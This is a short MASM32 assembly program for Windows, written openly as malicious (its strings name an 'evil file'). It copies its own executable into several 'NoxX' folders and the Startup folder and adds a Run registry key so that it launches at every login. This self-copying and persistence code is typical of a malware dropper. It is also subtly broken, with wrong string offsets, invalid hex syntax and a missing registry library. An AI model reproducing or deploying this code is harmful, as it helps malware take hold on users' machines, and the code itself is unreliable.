include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib

.data
    src db 260 dup(0)
    targetDirs db "C:\ProgramData\NoxX", 0, \
                  "C:\Windows\Temp\NoxX", 0, \
                  "C:\Users\Public\NoxX", 0, \
                  "C:\Program Files\NoxX", 0, \
                  "C:\Documents and Settings\NoxX", 0
    startupPath db "C:\Users\Public\Start Menu\Programs\Startup\noxx_startup.bat", 0
    regPath db "Software\Microsoft\Windows\CurrentVersion\Run", 0
    regName db "NoxX", 0
    regCmd db "C:\ProgramData\NoxX\noxx.bat", 0
    msg db "Operazione completata", 0
    hKey DWORD ?
    result DWORD ?
    fileName db "file_malvagio_", 0
    fileExt db ".txt", 0
    tempFile db "%TEMP%\file_malvagio_1.txt", 0
    key DWORD ?
    buffer db 256 dup(0)
    directory db 260 dup(0)
    index DWORD ?
    counter DWORD ?

.code
start:
    invoke GetModuleFileName, NULL, addr src, 260
    mov ecx, 5
    lea esi, targetDirs
create_dirs:
    invoke CreateDirectory, esi, NULL
    add esi, 0x100
    loop create_dirs

    lea esi, targetDirs
    mov ecx, 5
copy_files:
    invoke CopyFile, addr src, esi, FALSE
    add esi, 0x100
    loop copy_files

    invoke CopyFile, addr src, addr startupPath, FALSE

    invoke RegOpenKeyEx, HKEY_CURRENT_USER, addr regPath, 0, KEY_WRITE, addr hKey
    invoke RegSetValueEx, hKey, addr regName, 0, REG_SZ, addr regCmd, sizeof regCmd
    invoke RegCloseKey, hKey

    invoke MessageBox, NULL, addr msg, addr msg, MB_OK

    invoke ExitProcess, 0
end start
